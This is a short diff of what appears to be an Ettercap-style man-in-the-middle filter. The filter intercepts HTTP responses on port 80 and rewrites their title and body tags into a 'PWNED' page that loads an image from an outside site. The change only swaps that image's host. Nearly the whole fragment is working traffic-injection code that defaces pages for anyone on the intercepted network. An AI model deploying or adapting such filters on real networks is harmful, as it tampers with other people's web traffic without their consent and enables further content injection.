@@ -21,8 +21,8 @@ if (ip.proto == TCP && tcp.dst == 80) {
    }  
  }  
  if (ip.proto == TCP && tcp.src == 80) {  
-   replace("<title>", "<title>PWNED<\/tITle><bodY><p><img src="http://www.fruitywifi.com/img/logo-480.jpg"></p></boDY>");  
-   replace("<TITLE>", "<title>PWNED<\/tITle><bodY><p><img src="http://www.fruitywifi.com/img/logo-480.jpg"></p></boDY>");  
+   replace("<title>", "<title>PWNED<\/tITle><bodY><p><img src="http://www.blackbulb.com/img/logo-480.jpg"></p></boDY>");
+   replace("<TITLE>", "<title>PWNED<\/tITle><bodY><p><img src="http://www.blackbulb.com/img/logo-480.jpg"></p></boDY>");
    replace("</title>", " ");  
    replace("</TITLE>", " ");  
    replace("<body>", " ");  
